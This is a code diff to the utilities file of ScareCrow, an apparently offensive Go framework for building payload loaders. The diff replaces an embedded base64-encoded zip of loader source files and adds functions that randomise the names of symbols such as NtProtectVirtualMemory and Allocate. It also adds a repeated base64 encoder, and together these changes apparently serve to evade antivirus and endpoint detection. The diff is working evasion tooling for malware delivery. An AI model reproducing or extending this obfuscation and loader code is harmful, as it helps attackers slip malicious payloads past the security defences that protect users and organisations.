@@ -3,17 +3,65 @@ package Utils
 import (
 	"ScareCrow/Cryptor"
 	"archive/zip"
+	"bytes"
 	"encoding/base64"
 	"fmt"
 	"io"
+	"io/ioutil"
+	"log"
 	"os"
 	"path/filepath"
+	"runtime"
+	"strconv"
 	"strings"
 
 	"github.com/fatih/color"
 )
 
-const base64string = "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"
+const base64string = "UEsDBBQAAAAIAJd4LlM+e3cvTgAAAFQAAAAGABwAZ28ubW9kVVQJAAMNukBh4LlAYXV4CwABBAAAAAAEAAAAAA3CbQqAIAwA0P87hRfwY0Or64iOEVgjxajbF+8dWmdj0zRX7gCiBh2uAJ2vuXc2oi2f4rSLf/x4h7mD+1kKhAEpYoopbpao5oUYqYQCH1BLAwQUAAAACAABeC5TUV+psJkAAADPAAAABgAcAGdvLnN1bVVUCQAD8rhAYQK5QGF1eAsAAQQAAAAABAAAAACVzV0OQzAAAOB3p3AB+rPaaomXYR4mDUuweKOkYqZby3D7bUdYvgN8Qg7VKGypBFiB3rT5hvaXhSFGEGGCHOIQamHcVHvcIswhNzt0zJdNZGpc3H6klJOZRsFOlWn9UgmYRKUpnZKsPq2punuG+P8AQtoP2fyqDrG+4K17u8ZRGurisDwvzO8jN5jY4A/5fI7DsglYHWrP+ABQSwMECgAAAAAAe3guUwAAAAAAAAAAAAAAAAcAHABsb2FkZXIvVVQJAAPauUBhgLpAYXV4CwABBAAAAAAEAAAAAFBLAwQUAAAACAB7eC5TXLENlaoAAAD5AAAAEAAcAGxvYWRlci9sb2FkZXIuZ29VVAkAA9q5QGHJuUBhdXgLAAEEAAAAAAQAAAAAXY4/C8JADMX3+xQZWzgK/sG9nVyUouLgFq6xHl4vJaaDit/dWs/FIZCX8Hvv9eiu2BIExobEmPMQHXToY5bD05hXupQhsEOlzGEIvoHBR52tLNRrjE2gSa+WFiq8UWnhRMKV15uFHbWe494/yH5NDvd+XGthJacT16tYiKwXH9tklP8eKX6rCTh60QHDhjqW+38ZlPYCRVEkNoeMRBw333qLuYVRf4YlN29QSwMEFAAAAAgAbnguU233SYYyAgAAOwQAAAwAHABsb2FkZXIvYXNtLnNVVAkAA7+5QGHLuEBhdXgLAAEEAAAAAAQAAAAAdVNNk5pAED3Dr+iqeIDACn6shclJxWStciMy7obkYrEwKlXIWDNDVn9Z7vllmWFgIyahSsr3unt6ut9jM4828OvnJM9JEnNsoKlpd9y7+5GuadEqXMMksieRDvXzuHr+Ckmc51lqucanwLShHV1D8BAXaY4tT4VnEbTjKLDBvyInvr+GjnseepJv53Zc2/Ajs01+x5RMM86swb1qEXp/dwjHtx2GrmRvSM9GQbt4Ftlhz33j0Dc0myyXf/DT9LYsnG903XHQgZQc5I8TmN0h8d4RCgecn7JiD0cMjOQ/MPADhoyxEgPZAXS7XYhzwiXgh4wJwAi8xAynQAo4cH5iHxxnT/K42HcJ3TuMJg4tC54dscMubPuaFSl5Zdv4mI6GXaa/S/EuKzAc43NM9ww8cbddWSSALkwqZyj5oMwK3hvZIJIO8hoSnzg1wZD/Bn0bMKWEmvpGWeQLDyjhOOHPGeVlnD/iI6GXyjBQO+bKMNq/naIFT+hBLrlKWFfNtzkurN6oymkH5BpqH6GFCmjueeAan5E4zlfUUhMuAfc88gx/YeqaVEjrGPX47z2RKcRSxZX3RNls6etaOA8+Ss3R+ioq+6gTvKs610CLyss19hT2GyxuXxHCiYroD2tiXBPCVhC5NfAl6NUgFI2ifgPGAgzqHcga6UWtMaEmTStma4azeubbfMEqkF3qlQgRpHwJSbE16MsN/n99zeqUQFVWXb7NePwiPuWhq06QTm9cr+u/AVBLAQIeAxQAAAAIAJd4LlM+e3cvTgAAAFQAAAAGABgAAAAAAAEAAACkgQAAAABnby5tb2RVVAUAAw26QGF1eAsAAQQAAAAABAAAAABQSwECHgMUAAAACAABeC5TUV+psJkAAADPAAAABgAYAAAAAAABAAAApIGOAAAAZ28uc3VtVVQFAAPyuEBhdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAe3guUwAAAAAAAAAAAAAAAAcAGAAAAAAAAAAQAO1BZwEAAGxvYWRlci9VVAUAA9q5QGF1eAsAAQQAAAAABAAAAABQSwECHgMUAAAACAB7eC5TXLENlaoAAAD5AAAAEAAYAAAAAAABAAAApIGoAQAAbG9hZGVyL2xvYWRlci5nb1VUBQAD2rlAYXV4CwABBAAAAAAEAAAAAFBLAQIeAxQAAAAIAG54LlNt90mGMgIAADsEAAAMABgAAAAAAAEAAACkgZwCAABsb2FkZXIvYXNtLnNVVAUAA7+5QGF1eAsAAQQAAAAABAAAAABQSwUGAAAAAAUABQCNAQAAFAUAAAAA"
+
+func Version() {
+	Version := runtime.Version()
+	Version = strings.Replace(Version, "go1.", "", -1)
+	VerNumb, _ := strconv.ParseFloat(Version, 64)
+	if VerNumb >= 16.1 {
+	} else {
+		log.Fatal("Error: The version of Go is to old, please update to version 1.16.1 or later")
+	}
+}
+
+func ModuleObfuscator(name string) {
+	NTVirProt := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
+	Alloc := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
+	loader := Cryptor.VarNumberLength(10, 19)
+	name = name + ".go"
+	PackageEditor("loader/loader.go", "NtProtectVirtualMemory", NTVirProt)
+	PackageEditor("loader/loader.go", "Allocate", Alloc)
+	PackageEditor("loader/loader.go", "loader", loader)
+	PackageEditor("loader/asm.s", "NtProtectVirtualMemory", NTVirProt)
+	PackageEditor("loader/asm.s", "Allocate", Alloc)
+	PackageEditor(name, "[loader]", loader)
+	PackageEditor(name, "[NtProtectVirtualMemory]", NTVirProt)
+	PackageEditor(name, "[Allocate]", Alloc)
+	PackageEditor("go.mod", "loader", loader)
+	os.Rename("loader/loader.go", "loader/"+loader+".go")
+	os.Rename("loader", loader)
+}
+
+func PackageEditor(file, orginalstring, replacestring string) {
+	input, err := ioutil.ReadFile(file)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+
+	output := bytes.Replace(input, []byte(orginalstring), []byte(replacestring), -1)
+
+	if err = ioutil.WriteFile(file, output, 0666); err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+}
 
 func Writefile(outFile string, result string) {
 	cf, err := os.OpenFile(outFile, os.O_CREATE|os.O_WRONLY, 0644)
@@ -27,6 +75,17 @@ func check(e error) {
 	if e != nil {
 		panic(e)
 	}
+}
+
+func StringEncode(b64 string, number int) string {
+	var encoded string
+	encoded = base64.StdEncoding.EncodeToString([]byte(b64))
+	sum := 1
+	for i := 1; i < number; i++ {
+		encoded = base64.StdEncoding.EncodeToString([]byte(encoded))
+		sum += i
+	}
+	return encoded
 }
 
 func B64ripper(B64string string, B64Varible string, implant bool) string {
